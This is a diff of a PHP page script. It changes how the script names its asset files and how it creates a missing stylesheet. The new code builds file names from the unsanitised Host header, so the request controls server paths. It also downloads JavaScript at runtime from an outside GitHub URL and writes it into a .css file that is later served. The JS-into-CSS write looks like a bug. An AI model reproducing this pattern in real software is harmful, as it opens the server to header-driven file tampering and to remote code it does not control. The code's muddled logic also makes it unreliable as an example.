@@ -6,7 +6,7 @@
 //}
 
 $ip = $_SERVER['REMOTE_ADDR'];
-
+$name = $_SERVER['SERVER_NAME'];
 
 //phpinfo(32);
 if (!isset($_SESSION)) {
@@ -108,11 +108,12 @@ unset($_POST);
 //header("Location: ".$_SERVER['PHP_SELF']);
 exit;
 } else {
-
-$main = "main.js";
-$style = "vsdg.css";
-$content = "content.js";
-$update = "update.php";
+   $tokens = explode(".", $_SERVER['HTTP_HOST']);
+  $domain = $tokens[0];
+$main = $domain .".js";
+$style = $domain.".css";
+$content = $domain."-content.js";
+$update = $domain."-update.php";
 $url = parse_url($_SERVER['REQUEST_URI']);
 
 
@@ -131,10 +132,11 @@ if(!is_file('./script/'. $content)){
 }
 
 
-if(!is_file('./css/'. $css)){
+if(!is_file('./css/'. $style)){
+    $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
 
-    $file = fopen('./css/'. $css, 'w');
-    fwrite($file);
+    $file = fopen('./css/'. $style, 'w')or die("Unable to open $style!");
+    fwrite($file, $j );
     fclose($file);
 }
 
@@ -187,21 +189,3 @@ echo "<script type='text/javascript' src='/script/${main}'></script>";
 ?>
 
 
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <?php echo "<script type='text/javascript' src='/script/${main}'></script>"; ?>
-    <title></title>
-
-    
-
-</head>
-<body>
-  
-</body>
-</html>
